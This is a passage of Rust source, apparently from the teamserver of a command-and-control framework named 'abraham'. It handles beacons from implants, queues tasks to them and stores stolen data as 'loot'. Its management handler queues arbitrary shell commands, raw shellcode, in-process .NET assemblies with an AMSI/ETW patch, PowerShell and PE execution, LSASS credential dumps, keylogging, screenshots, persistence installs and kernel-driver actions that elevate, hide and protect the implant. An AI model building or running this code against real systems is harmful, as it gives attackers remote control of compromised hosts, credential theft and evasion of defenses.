                    empty_poll = false;
                }
                if outbound.is_empty() && pending_config.is_none() {
                    let version = { live.info.lock().unwrap().implant_version.clone() };
                    empty_poll = implant_supports_204(&version);
                } else if !outbound.is_empty() {
                    for message in &outbound {
                        if let Message::Task(task) = message {
                            audit(
                                state,
                                "task_delivered",
                                json!({
                                    "session": live.id,
                                    "task_id": task.id,
                                    "kind": task_kind_name(&task.body),
                                }),
                            );
                        }
                    }
                    // Delivered messages leave the persisted queue: save.
                    dirty = true;
                    for message in outbound {
                        let (mt, body) = message.encode();
                        response.extend_from_slice(&live.seal(mt, &body)?);
                    }
                }
                if !empty_poll {
                    let (mt, body) = Message::BatchEnd.encode();
                    response.extend_from_slice(&live.seal(mt, &body)?);
                }
            }
            msg::RESULT => {
                if let Message::TaskResult(result) = Message::decode(msg_type, &payload)? {
                    audit(
                        state,
                        "task_result",
                        json!({
                            "session": live.id,
                            "task_id": result.id,
                            "status": result.status,
                        }),
                    );
                    store_task_result(&live.results, result).await;
                    dirty = true;
                }
            }
            msg::CHUNK => {
                if let Message::Chunk(chunk) = Message::decode(msg_type, &payload)? {
                    // Buffer under the lock; the loot write (async fs) runs
                    // outside it.
                    let completed = {
                        let mut pending = live.pending_uploads.lock().unwrap();
                        let entry = pending.entry(chunk.task_id).or_default();
                        entry.extend_from_slice(&chunk.data);
                        if chunk.last {
                            pending.remove(&chunk.task_id)
                        } else {
                            None
                        }
                    };
                    if let Some(data) = completed {
                        let (mt, body) =
                            write_loot(state, live.id, chunk.task_id, data, &live.results).await?;
                        response.extend_from_slice(&live.seal(mt, &body)?);
                        dirty = true;
                    }
                }
            }
            msg::PING => {
                let (mt, body) = Message::Pong.encode();
                response.extend_from_slice(&live.seal(mt, &body)?);
            }
            msg::ERROR => {
                if let Message::Error { code, message } = Message::decode(msg_type, &payload)? {
                    eprintln!("[!] implant reported error {code}: {message}");
                }
            }
            _ => {}
        }
    }
    if empty_poll && response.is_empty() {
        // Nothing to deliver and nothing sealed: the idle poll answers
        // 204 with no body (0.2.0+ implants treat it as an empty batch).
        write_response(stream, 204, &profile.server_header, b"").await?;
    } else {
        write_response(stream, 200, &profile.server_header, &response).await?;
    }
    if dirty {
        persist_state(state).await;
    }
    Ok(())
}

async fn store_task_result(results: &Arc<RwLock<Vec<StoredResult>>>, result: TaskResult) {
    let summary = match String::from_utf8(result.data.clone()) {
        Ok(text) => {
            let text = text.replace(['\r', '\n'], " ");
            if text.len() > 2000 {
                format!("{}...", &text[..2000])
            } else {
                text
            }
        }
        Err(_) => format!("<{} bytes>", result.data.len()),
    };
    results.write().await.push(StoredResult {
        task_id: result.id,
        kind: "task".into(),
        status: result.status,
        summary,
        timestamp: now(),
    });
}

/// Writes a completed chunked payload as loot and returns the ack frame
/// body for the response.
async fn write_loot(
    state: &Arc<AppState>,
    session_id: u32,
    task_id: u32,
    data: Vec<u8>,
    results: &Arc<RwLock<Vec<StoredResult>>>,
) -> anyhow::Result<(u8, Vec<u8>)> {
    let dir = PathBuf::from(format!("loot/session-{session_id}"));
    tokio::fs::create_dir_all(&dir).await?;
    let path = dir.join(format!("task-{task_id}.bin"));
    tokio::fs::write(&path, &data).await?;
    audit(
        state,
        "download_loot",
        json!({
            "session": session_id,
            "task_id": task_id,
            "bytes": data.len(),
            "path": path.to_string_lossy(),
        }),
    );
    results.write().await.push(StoredResult {
        task_id,
        kind: "download".into(),
        status: message::STATUS_OK,
        summary: format!("{} ({} bytes)", path.display(), data.len()),
        timestamp: now(),
    });
    let ack = Message::TaskResult(TaskResult {
        id: task_id,
        status: message::STATUS_OK,
        data: path.to_string_lossy().as_bytes().to_vec(),
    });
    let (mt, body) = ack.encode();
    Ok((mt, body))
}

#[derive(Serialize, Deserialize)]
struct PersistedInfo {
    token: u64,
    hostname: String,
    username: String,
    domain: String,
    pid: u32,
    ppid: u32,
    arch: u8,
    integrity_level: u8,
    os_build: String,
    implant_version: String,
}

/// One queued message stored as its WIRE ENCODING: decode is shared
/// with the live path, so every task kind persists without a mirror
/// enum to maintain. Body is hex — JSON has no binary.
#[derive(Serialize, Deserialize)]
struct PersistedFrame {
    msg_type: u8,
    body: String,
}

#[derive(Serialize, Deserialize)]
struct PersistedSession {
    id: u32,
    info: PersistedInfo,
    addr: String,
    last_seen: u64,
    results: Vec<StoredResult>,
    /// Messages queued but not yet delivered when the server stopped.
    #[serde(default)]
    pending: Vec<PersistedFrame>,
}

#[derive(Serialize, Deserialize)]
struct PersistedState {
    next_session_id: u32,
    next_task_id: u32,
    sessions: Vec<PersistedSession>,
}

/// Snapshots the session registry (ids, tokens, identity, result
/// history, QUEUED TASKS, counters) so a restart — a redeploy — keeps
/// the sessions and beacons RESUME into them on the next re-register,
/// draining whatever was still queued. Failures log and continue:
/// persistence is an operational nicety, not a correctness gate.
async fn persist_state(state: &Arc<AppState>) {
    let Some(path) = state.state_path.clone() else {
        return;
    };
    let mut sessions = Vec::new();
    {
        let registry = state.sessions.read().await;
        for live in registry.values() {
            // Guards close before the results await below (Send future).
            let (info, addr) = {
                let info = live.info.lock().unwrap();
                (
                    PersistedInfo {
                        token: info.session_token,
                        hostname: info.hostname.clone(),
                        username: info.username.clone(),
                        domain: info.domain.clone(),
                        pid: info.pid,
                        ppid: info.ppid,
                        arch: info.arch,
                        integrity_level: info.integrity_level,
                        os_build: info.os_build.clone(),
                        implant_version: info.implant_version.clone(),
                    },
                    live.addr.lock().unwrap().clone(),
                )
            };
            let mut results = live.results.read().await.clone();
            if results.len() > PERSIST_RESULT_CAP {
                results.drain(..results.len() - PERSIST_RESULT_CAP);
            }
            let pending = live
                .pending
                .lock()
                .unwrap()
                .iter()
                .map(|message| {
                    let (mt, body) = message.encode();
                    PersistedFrame {
                        msg_type: mt,
                        body: hex::encode(body),
                    }
                })
                .collect();
            sessions.push(PersistedSession {
                id: live.id,
                info,
                addr,
                last_seen: live.last_seen.load(Ordering::SeqCst),
                results,
                pending,
            });
        }
    }
    let snapshot = PersistedState {
        next_session_id: state.next_session_id.load(Ordering::SeqCst),
        next_task_id: state.next_task_id.load(Ordering::SeqCst),
        sessions,
    };
    let data = match serde_json::to_vec(&snapshot) {
        Ok(data) => data,
        Err(e) => {
            eprintln!("[!] state serialize: {e}");
            return;
        }
    };
    let tmp = path.with_extension("json.tmp");
    if let Some(parent) = path.parent() {
        let _ = tokio::fs::create_dir_all(parent).await;
    }
    if let Err(e) = tokio::fs::write(&tmp, &data).await {
        eprintln!("[!] state write {}: {e}", tmp.display());
        return;
    }
    if let Err(e) = tokio::fs::rename(&tmp, &path).await {
        eprintln!("[!] state rename to {}: {e}", path.display());
    }
}

/// Restores the registry from the persistence file. Restored sessions
/// have no transport (crypto `None`) until their beacon re-registers.
async fn load_state(state: &Arc<AppState>, path: &Path) -> anyhow::Result<usize> {
    let bytes = tokio::fs::read(path).await?;
    let parsed: PersistedState = serde_json::from_slice(&bytes)?;
    let mut loaded = 0usize;
    let mut max_id = 0u32;
    let mut max_task = 0u32;
    for persisted in parsed.sessions {
        max_id = max_id.max(persisted.id);
        for result in &persisted.results {
            max_task = max_task.max(result.task_id);
        }
        let mut pending_queue = VecDeque::new();
        for frame in &persisted.pending {
            match hex::decode(&frame.body)
                .map_err(|e| e.to_string())
                .and_then(|body| Message::decode(frame.msg_type, &body).map_err(|e| e.to_string()))
            {
                Ok(message) => {
                    if let Message::Task(task) = &message {
                        max_task = max_task.max(task.id);
                    }
                    pending_queue.push_back(message);
                }
                Err(e) => eprintln!(
                    "[!] state: session {} dropped undecodable pending frame: {e}",
                    persisted.id
                ),
            }
        }
        let info = RegisterInfo {
            session_token: persisted.info.token,
            hostname: persisted.info.hostname,
            username: persisted.info.username,
            domain: persisted.info.domain,
            pid: persisted.info.pid,
            ppid: persisted.info.ppid,
            arch: persisted.info.arch,
            integrity_level: persisted.info.integrity_level,
            os_build: persisted.info.os_build,
            implant_version: persisted.info.implant_version,
        };
        let token = info.session_token;
        let id = persisted.id;
        let live = Arc::new(LiveSession {
            id,
            crypto: SyncMutex::new(None),
            info: SyncMutex::new(info),
            addr: SyncMutex::new(persisted.addr),
            last_seen: AtomicU64::new(persisted.last_seen),
            pending: SyncMutex::new(pending_queue),
            results: Arc::new(RwLock::new(persisted.results)),
            pending_uploads: SyncMutex::new(HashMap::new()),
            real_ip: SyncMutex::new(String::new()),
            applied_config: SyncMutex::new(None),
        });
        if token != 0 {
            state.tokens.write().await.insert(token, id);
        }
        state.sessions.write().await.insert(id, live);
        loaded += 1;
    }
    state
        .next_session_id
        .store(parsed.next_session_id.max(max_id + 1), Ordering::SeqCst);
    state
        .next_task_id
        .store(parsed.next_task_id.max(max_task + 1), Ordering::SeqCst);
    Ok(loaded)
}

async fn run_mgmt(stream: TcpStream, state: Arc<AppState>) -> anyhow::Result<()> {
    stream.set_nodelay(true)?;
    let peer = stream
        .peer_addr()
        .map(|p| p.to_string())
        .unwrap_or_default();
    let (rd, mut wr) = stream.into_split();
    let mut lines = BufReader::new(rd).lines();
    // Shared-secret gate: when --mgmt-token is set, the first line must
    // be {"auth": "<token>"} before any command is accepted.
    if let Some(token) = &state.mgmt_token {
        let first = lines.next_line().await?.unwrap_or_default();
        let authorized = serde_json::from_str::<Value>(&first)
            .ok()
            .and_then(|v| v.get("auth").and_then(|a| a.as_str()).map(str::to_owned))
            .is_some_and(|supplied| supplied == *token);
        if !authorized {
            audit(&state, "mgmt_denied", json!({ "addr": peer }));
            wr.write_all(b"{\"error\":\"unauthorized\"}\n").await?;
            return Ok(());
        }
        // Ack so clients can confirm the gate before queueing commands.
        wr.write_all(b"{\"ok\":true}\n").await?;
    }
    while let Some(line) = lines.next_line().await? {
        let response = match serde_json::from_str::<Value>(&line) {
            Err(e) => json!({ "error": format!("invalid json: {e}") }),
            Ok(request) => handle_mgmt(request, &state).await,
        };
        wr.write_all(serde_json::to_string(&response)?.as_bytes())
            .await?;
        wr.write_all(b"\n").await?;
    }
    Ok(())
}

async fn handle_mgmt(request: Value, state: &Arc<AppState>) -> Value {
    let cmd = request
        .get("cmd")
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .to_string();
    match cmd.as_str() {
        "sessions" => list_sessions(state).await,
        "shell" => {
            let command = request
                .get("command")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            queue_task(state, &request, TaskBody::Shell { command }).await
        }
        "module" => {
            let name = request
                .get("name")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            let args = request
                .get("args")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            if name.is_empty() {
                return json!({ "error": "module requires name" });
            }
            queue_task(state, &request, TaskBody::Module { name, args }).await
        }
        "driver" => {
            let action = match request.get("action").and_then(|v| v.as_str()) {
                Some("load") => driver_action::LOAD,
                Some("unload") => driver_action::UNLOAD,
                Some("probe") => driver_action::PROBE,
                Some("elevate") => driver_action::ELEVATE,
                Some("gate") => driver_action::GATE,
                Some("hide") => driver_action::HIDE,
                Some("unhide") => driver_action::UNHIDE,
                Some("call") => driver_action::CALL,
                Some("call-preflight") => driver_action::CALL_PREFLIGHT,
                Some("map") => driver_action::MAP,
                Some("modhide") => driver_action::MODHIDE,
                Some("modshow") => driver_action::MODSHOW,
                Some("protect") => driver_action::PROTECT,
                Some("chan") => driver_action::CHAN,
                _ => {
                    return json!({ "error": "driver action must be load, unload, probe, elevate, gate, hide, unhide, call-preflight, call, map, modhide, modshow, protect or chan" });
                }
            };
            let service = request
                .get("service")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            if service.is_empty()
                && !matches!(
                    action,
                    driver_action::PROBE
                        | driver_action::ELEVATE
                        | driver_action::GATE
                        | driver_action::HIDE
                        | driver_action::UNHIDE
                        | driver_action::CALL
                        | driver_action::CALL_PREFLIGHT
                        | driver_action::MAP
                        | driver_action::MODHIDE
                        | driver_action::MODSHOW
                        | driver_action::PROTECT
                        | driver_action::CHAN
                )
            {
                return json!({ "error": "driver requires service" });
            }
            let source = request
                .get("source")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            let drop_path = request
                .get("drop_path")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            queue_task(
                state,
                &request,
                TaskBody::Driver {
                    action,
                    service,
                    source,
                    drop_path,
                },
            )
            .await
        }
        "bof" => {
            // ABR-T034: run an operator-side COFF object in-process.
            // Args pack server-side, CS convention:
            // [u32 total][i32 type][payload]*, type 0=int, 1=short, 2=str.
            let source = request
                .get("source")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            if source.is_empty() {
                return json!({ "error": "bof requires source (local .obj file)" });
            }
            let data = match tokio::fs::read(&source).await {
                Err(e) => return json!({ "error": format!("cannot read {source}: {e}") }),
                Ok(data) => data,
            };
            if data.len() > 48_000 {
                return json!({ "error": "bof object exceeds 48000 byte frame cap" });
            }
            let mut args = Vec::new();
            if let Some(list) = request.get("args").and_then(|v| v.as_array()) {
                let mut body = Vec::new();
                for entry in list {
                    let kind = entry.get("type").and_then(|v| v.as_str()).unwrap_or("str");
                    body.extend_from_slice(&match kind {
                        "int" => 0i32.to_le_bytes().to_vec(),
                        "short" => 1i32.to_le_bytes().to_vec(),
                        _ => 2i32.to_le_bytes().to_vec(),
                    });
                    match kind {
                        "int" => body.extend_from_slice(
                            &(entry.get("value").and_then(|v| v.as_i64()).unwrap_or(0) as i32)
                                .to_le_bytes(),
                        ),
                        "short" => body.extend_from_slice(
                            &(entry.get("value").and_then(|v| v.as_i64()).unwrap_or(0) as i16)
                                .to_le_bytes(),
                        ),
                        _ => {
                            body.extend_from_slice(
                                entry
                                    .get("value")
                                    .and_then(|v| v.as_str())
                                    .unwrap_or("")
                                    .as_bytes(),
                            );
                            body.push(0);
                        }
                    }
                }
                let total = (body.len() + 4) as u32;
                args.extend_from_slice(&total.to_le_bytes());
                args.extend_from_slice(&body);
            }
            queue_task(state, &request, TaskBody::ExecBof { data, args }).await
        }
        "cred" => {
            // ABR-T032/T033: LSASS minidump (user-mode / kernel-attach).
            let action = match request.get("action").and_then(|v| v.as_str()) {
                Some("user") => cred_action::LSASS_USER,
                Some("kernel") => cred_action::LSASS_KERNEL,
                _ => {
                    return json!({ "error": "cred action must be user or kernel" });
                }
            };
            let arg = request
                .get("arg")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            queue_task(state, &request, TaskBody::Cred { action, arg }).await
        }
        "collect" => {
            // ABR-T031: screenshot / clipboard / keylog dump.
            let action = match request.get("action").and_then(|v| v.as_str()) {
                Some("screenshot") => collect_action::SCREENSHOT,
                Some("clipboard") => collect_action::CLIPBOARD,
                Some("keylog") => collect_action::KEYLOG_DUMP,
                _ => {
                    return json!({ "error": "collect action must be screenshot, clipboard or keylog" });
                }
            };
            let arg = request
                .get("arg")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            queue_task(state, &request, TaskBody::Collect { action, arg }).await
        }
        "persist" => {
            // ABR-T030: host persistence install/remove/list.
            let action = match request.get("action").and_then(|v| v.as_str()) {
                Some("install") => persist_action::INSTALL,
                Some("remove") => persist_action::REMOVE,
                Some("list") => persist_action::LIST,
                _ => return json!({ "error": "persist action must be install, remove or list" }),
            };
            let mechanism = request
                .get("mechanism")
                .and_then(|v| v.as_str())
                .unwrap_or("run-key")
                .to_string();
            let name = request
                .get("name")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            let exe = request
                .get("exe")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            let args = request
                .get("args")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            if name.is_empty() {
                return json!({ "error": "persist requires name" });
            }
            queue_task(
                state,
                &request,
                TaskBody::Persist {
                    action,
                    mechanism,
                    name,
                    exe,
                    args,
                },
            )
            .await
        }
        "runpe" => {
            // ABR-T027: inline bytes when they fit the frame, else the
            // operator uploads the stage first and passes "path".
            let source = request
                .get("source")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            let path = request
                .get("path")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            if source.is_empty() && path.is_empty() {
                return json!({ "error": "runpe requires source (local PE) or path (staged)" });
            }
            if !path.is_empty() {
                return queue_task(
                    state,
                    &request,
                    TaskBody::RunPe {
                        data: Vec::new(),
                        path,
                    },
                )
                .await;
            }
            match tokio::fs::read(&source).await {
                Err(e) => json!({ "error": format!("cannot read {source}: {e}") }),
                Ok(data) => {
                    if data.len() > 48_000 {
                        return json!({
                            "error": format!(
                                "{}B exceeds the 48000B frame cap - upload it to the target and pass 'path'",
                                data.len()
                            )
                        });
                    }
                    queue_task(
                        state,
                        &request,
                        TaskBody::RunPe {
                            data,
                            path: String::new(),
                        },
                    )
                    .await
                }
            }
        }
        "cfg" => {
            // ABR-T037: operator management of the server-driven
            // configuration rule table. First rule that matches wins;
            // changes bump the epoch and re-resolve on every poll.
            let action = request.get("action").and_then(|v| v.as_str()).unwrap_or("");
            match action {
                "list" => {
                    let rules = state.config.lock().unwrap().clone();
                    json!({
                        "epoch": rules.epoch,
                        "rules": rules.rules.iter().enumerate().map(|(index, rule)| {
                            json!({
                                "index": index,
                                "note": rule.note,
                                "match_domain": rule.match_domain,
                                "match_hostname_prefix": rule.match_hostname_prefix,
                                "match_user": rule.match_user,
                                "match_net": rule.match_net,
                                "sleep_secs": rule.sleep_secs,
                                "jitter": rule.jitter,
                                "uris": rule.uris,
                                "user_agents": rule.user_agents,
                            })
                        }).collect::<Vec<_>>()
                    })
                }
                "add" => {
                    let rule: ConfigRule = match request.get("rule") {
                        Some(value) => match serde_json::from_value(value.clone()) {
                            Ok(rule) => rule,
                            Err(e) => return json!({ "error": format!("bad rule: {e}") }),
                        },
                        None => return json!({ "error": "cfg add requires rule (JSON object)" }),
                    };
                    if rule.match_domain.is_none()
                        && rule.match_hostname_prefix.is_none()
                        && rule.match_user.is_none()
                        && rule.match_net.is_none()
                    {
                        return json!({ "error": "rule needs at least one match field (domain, hostname_prefix, user, net)" });
                    }
                    if rule.sleep_secs.is_none()
                        && rule.jitter.is_none()
                        && rule.uris.is_empty()
                        && rule.user_agents.is_empty()
                    {
                        return json!({ "error": "rule changes nothing (set sleep_secs, jitter, uris and/or user_agents)" });
                    }
                    let mut rules = state.config.lock().unwrap();
                    rules.epoch += 1;
                    rules.rules.push(rule);
                    let epoch = rules.epoch;
                    let count = rules.rules.len();
                    drop(rules);
                    save_config_rules(state);
                    audit(
                        state,
                        "config_rule_changed",
                        json!({ "action": "add", "epoch": epoch }),
                    );
                    json!({ "ok": true, "epoch": epoch, "rules": count })
                }
                "remove" => {
                    let index = match request.get("index").and_then(|v| v.as_u64()) {
                        Some(index) => index as usize,
                        None => return json!({ "error": "cfg remove requires index" }),
                    };
                    let mut rules = state.config.lock().unwrap();
                    if index >= rules.rules.len() {
                        return json!({ "error": format!("index {index} out of range ({} rules)", rules.rules.len()) });
                    }
                    rules.rules.remove(index);
                    rules.epoch += 1;
                    let epoch = rules.epoch;
                    drop(rules);
                    save_config_rules(state);
                    audit(
                        state,
                        "config_rule_changed",
                        json!({ "action": "remove", "index": index, "epoch": epoch }),
                    );
                    json!({ "ok": true, "epoch": epoch })
                }
                "test" => {
                    let pick = |name: &str| {
                        request
                            .get(name)
                            .and_then(|v| v.as_str())
                            .unwrap_or("")
                            .to_string()
                    };
                    let (domain, hostname, user, ip) =
                        (pick("domain"), pick("hostname"), pick("user"), pick("ip"));
                    let rules = state.config.lock().unwrap().clone();
                    match rules.resolve(&domain, &hostname, &user, &ip) {
                        Some(rule) => {
                            let update = rule.update(rules.epoch);
                            json!({
                                "matched": true,
                                "note": rule.note,
                                "sleep_secs": update.sleep_secs,
                                "jitter": update.jitter,
                                "uris": update.uris,
                                "user_agents": update.user_agents,
                            })
                        }
                        None => json!({ "matched": false }),
                    }
                }
                _ => json!({ "error": "cfg action must be list, add, remove or test" }),
            }
        }
        "psrun" => {
            // ABR-T026: in-process PowerShell. The script arrives inline
            // ("script") or from a local .ps1 ("source"); the bootstrap
            // assembly is compiled once from tools/psboot.cs with the
            // in-box csc and cached under cache/.
            let mut script = request
                .get("script")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            let source = request
                .get("source")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            if script.is_empty() && !source.is_empty() {
                match tokio::fs::read_to_string(&source).await {
                    Ok(text) => script = text,
                    Err(e) => return json!({ "error": format!("cannot read {source}: {e}") }),
                }
            }
            if script.trim().is_empty() {
                return json!({ "error": "psrun requires script or source (.ps1)" });
            }
            let bootstrap = match ps_bootstrap() {
                Ok(bytes) => bytes,
                Err(e) => return json!({ "error": e }),
            };
            queue_task(state, &request, TaskBody::PowerShell { script, bootstrap }).await
        }
        "execasm" => {
            // ABR-T025: run an operator-side .NET assembly inside the
            // implant through CLR hosting (optional AMSI/ETW patch
            // first, ABR-T024).
            let source = request
                .get("source")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            if source.is_empty() {
                return json!({ "error": "execasm requires source (local assembly file)" });
            }
            let type_name = request
                .get("type")
                .and_then(|v| v.as_str())
                .unwrap_or("Prog")
                .to_string();
            let method_name = request
                .get("method")
                .and_then(|v| v.as_str())
                .unwrap_or("Go")
                .to_string();
            let argument = request
                .get("argument")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            let patch = u8::from(
                request
                    .get("patch")
                    .and_then(|v| v.as_bool())
                    .unwrap_or(true),
            );
            match tokio::fs::read(&source).await {
                Err(e) => json!({ "error": format!("cannot read {source}: {e}") }),
                Ok(data) => {
                    if data.len() > 48_000 {
                        return json!({ "error": "execasm assembly exceeds 48000 byte frame cap" });
                    }
                    queue_task(
                        state,
                        &request,
                        TaskBody::ExecuteAssembly {
                            data,
                            type_name,
                            method_name,
                            argument,
                            patch,
                        },
                    )
                    .await
                }
            }
        }
        "exec" => {
            // ABR-T022: raw shellcode from an operator-side file runs
            // in-process on the implant. The protocol frame ceiling caps
            // the payload at 48 KB.
            let source = request
                .get("source")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            if source.is_empty() {
                return json!({ "error": "exec requires source (local shellcode file)" });
            }
            match tokio::fs::read(&source).await {
                Err(e) => json!({ "error": format!("cannot read {source}: {e}") }),
                Ok(data) => {
                    if data.len() > 48_000 {
                        return json!({ "error": "exec payload exceeds 48000 byte frame cap" });
                    }
                    queue_task(state, &request, TaskBody::Execute { data }).await
                }
            }
        }
        "upload" => {
            let local = request
                .get("local")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            let remote = request
                .get("remote")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            if local.is_empty() || remote.is_empty() {
                return json!({ "error": "upload requires local and remote" });
            }
            match tokio::fs::read(&local).await {
                Err(e) => json!({ "error": format!("cannot read {local}: {e}") }),
                Ok(data) => queue_upload(state, &request, remote, data).await,
            }
        }
        "download" => {
            let path = request
                .get("path")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            queue_task(state, &request, TaskBody::Download { path }).await
        }
        "sleep" => {
            let secs = request.get("secs").and_then(|v| v.as_u64()).unwrap_or(30);
            let jitter = request
                .get("jitter")
                .and_then(|v| v.as_f64())
                .unwrap_or(0.25) as f32;
            queue_task(state, &request, TaskBody::Sleep { secs, jitter }).await
        }
        "exit" => queue_task(state, &request, TaskBody::Exit).await,
        "results" => list_results(state, &request).await,
        _ => json!({ "error": "unknown command" }),
    }
}

/// Compiles tools/psboot.cs with the in-box .NET Framework compiler
/// (first call) and caches the assembly under cache/psboot.dll.
fn ps_bootstrap() -> Result<Vec<u8>, String> {
    let cache = PathBuf::from("cache/psboot.dll");
    if let Ok(bytes) = std::fs::read(&cache) {
        return Ok(bytes);
    }
    let csc = std::path::PathBuf::from("C:\\")
        .join("Windows")
        .join("Microsoft.NET")
        .join("Framework64")
        .join("v4.0.30319")
        .join("csc.exe");
    if !csc.exists() {
        return Err("in-box csc.exe not found on the teamserver host".into());
    }
    std::fs::create_dir_all("cache").map_err(|e| format!("cache dir: {e}"))?;
    let out = std::process::Command::new(&csc)
        .args(["/nologo", "/target:library"])
        .arg(format!("/out:{}", cache.display()))
        .arg(
            // Absolute path: csc resolves its arguments against its own
            // working directory quirks, and the teamserver may be launched
            // from anywhere.
            std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
                .parent()
                .unwrap()
                .join("tools")
                .join("psboot.cs")
                .to_string_lossy()
                .into_owned(),
        )
        .output()
        .map_err(|e| format!("csc spawn: {e}"))?;
    if !out.status.success() {
        return Err(format!("csc: {}", String::from_utf8_lossy(&out.stdout)));
    }
    std::fs::read(&cache).map_err(|e| format!("bootstrap read: {e}"))
}

fn session_id_of(request: &Value) -> Option<u32> {
    request
        .get("session")
        .and_then(|v| v.as_u64())
        .and_then(|v| u32::try_from(v).ok())
}

fn task_kind_name(body: &TaskBody) -> &'static str {
    match body {
        TaskBody::Shell { .. } => "shell",
        TaskBody::Upload { .. } => "upload",
        TaskBody::Download { .. } => "download",
        TaskBody::Sleep { .. } => "sleep",
        TaskBody::Module { .. } => "module",
        TaskBody::Driver { .. } => "driver",
        TaskBody::Execute { .. } => "exec",
        TaskBody::ExecuteAssembly { .. } => "execasm",
        TaskBody::PowerShell { .. } => "psrun",
        TaskBody::RunPe { .. } => "runpe",
        TaskBody::Persist { .. } => "persist",
        TaskBody::Collect { .. } => "collect",
        TaskBody::Cred { .. } => "cred",
        TaskBody::ExecBof { .. } => "bof",
        TaskBody::Exit => "exit",
    }
}

async fn queue_task(state: &Arc<AppState>, request: &Value, body: TaskBody) -> Value {
    let Some(session_id) = session_id_of(request) else {
        return json!({ "error": "session is required" });
    };
    let handle = {
        let sessions = state.sessions.read().await;
        let Some(handle) = sessions.get(&session_id) else {
            return json!({ "error": "unknown session" });
        };
        handle.clone()
    };
    let kind = task_kind_name(&body);
    let task_id = state.next_task_id.fetch_add(1, Ordering::SeqCst);
    handle
        .pending
        .lock()
        .unwrap()
        .push_back(Message::Task(Task { id: task_id, body }));
    audit(
        state,
        "task_queued",
        json!({ "session": session_id, "task_id": task_id, "kind": kind }),
    );
    // Persist the queue so a restart still delivers this task.
    persist_state(state).await;
    json!({ "queued": task_id })
}

async fn queue_upload(
    state: &Arc<AppState>,
    request: &Value,
    remote: String,
    data: Vec<u8>,
) -> Value {
    let Some(session_id) = session_id_of(request) else {
        return json!({ "error": "session is required" });
    };
    let handle = {
        let sessions = state.sessions.read().await;
        let Some(handle) = sessions.get(&session_id) else {
            return json!({ "error": "unknown session" });
        };
        handle.clone()
    };
    let task_id = state.next_task_id.fetch_add(1, Ordering::SeqCst);
    let task = Message::Task(Task {
        id: task_id,
        body: TaskBody::Upload { path: remote },
    });
    {
        let mut pending = handle.pending.lock().unwrap();
        pending.push_back(task);
        let total = data.len().div_ceil(CHUNK_SIZE).max(1);
        for (seq, part) in data.chunks(CHUNK_SIZE).enumerate() {
            pending.push_back(Message::Chunk(Chunk {
                task_id,
                seq: seq as u32,
                data: part.to_vec(),
                last: seq + 1 == total,
            }));
        }
    }
    audit(
        state,
        "task_queued",
        json!({ "session": session_id, "task_id": task_id, "kind": "upload", "bytes": data.len() }),
    );
    // One save for the whole batch, not per chunk.
    persist_state(state).await;
    json!({ "queued": task_id, "bytes": data.len() })
}

async fn list_sessions(state: &Arc<AppState>) -> Value {
    let sessions = state.sessions.read().await;
    let mut ids: Vec<&u32> = sessions.keys().collect();
    ids.sort();
    let list: Vec<Value> = ids
        .iter()
        .map(|id| {
            let h = &sessions[*id];
            let info = h.info.lock().unwrap();
            let last_seen = h.last_seen.load(Ordering::SeqCst);
            let age = now().saturating_sub(last_seen);
            let pending_tasks = h
                .pending
                .lock()
                .unwrap()
                .iter()
                .filter(|message| matches!(message, Message::Task(_)))
                .count();
            json!({
                "id": id,
                "username": info.username.as_str(),
                "domain": info.domain.as_str(),
                "user": format!("{}\\{}", info.domain, info.username),
                "hostname": info.hostname.as_str(),
                "pid": info.pid,
                "ppid": info.ppid,
                "arch": if info.arch == message::ARCH_X64 { "x64" } else { "arm64" },
                "integrity_level": info.integrity_level,
                "os_build": info.os_build.as_str(),
                "addr": h.addr.lock().unwrap().as_str(),
                "last_seen": last_seen,
                "age": age,
                "stale": age > state.stale_after_secs,
                "implant_version": info.implant_version.as_str(),
                "pending_tasks": pending_tasks,
            })
        })
        .collect();
    json!({ "sessions": list })
}

async fn list_results(state: &Arc<AppState>, request: &Value) -> Value {
    let Some(session_id) = session_id_of(request) else {
        return json!({ "error": "session is required" });
    };
    let sessions = state.sessions.read().await;
    let Some(handle) = sessions.get(&session_id) else {
        return json!({ "error": "unknown session" });
    };
    let limit = request.get("limit").and_then(|v| v.as_u64()).unwrap_or(20) as usize;
    let results = handle.results.read().await;
    let list: Vec<Value> = results
        .iter()
        .rev()
        .take(limit)
        .map(|r| {
            json!({
                "task_id": r.task_id,
                "kind": r.kind,
                "status": r.status,
                "summary": r.summary,
                "timestamp": r.timestamp,
            })
        })
        .collect();
    json!({ "results": list })
}

#[cfg(test)]
mod tests {
    use super::*;
    use abraham_common::http::{read_response, write_request};
    use tokio::io::{AsyncReadExt, DuplexStream};

    fn test_state(path: Option<PathBuf>, mgmt_token: Option<String>) -> Arc<AppState> {
        Arc::new(AppState {
            sessions: RwLock::new(HashMap::new()),
            tokens: RwLock::new(HashMap::new()),
            provisionals: SyncMutex::new(HashMap::new()),
            next_session_id: AtomicU32::new(1),
            next_task_id: AtomicU32::new(1),
            signing_key: SigningKey::generate(&mut OsRng),
            state_path: path,
            audit_path: SyncMutex::new(None),
            mgmt_token,
            stale_after_secs: 120,
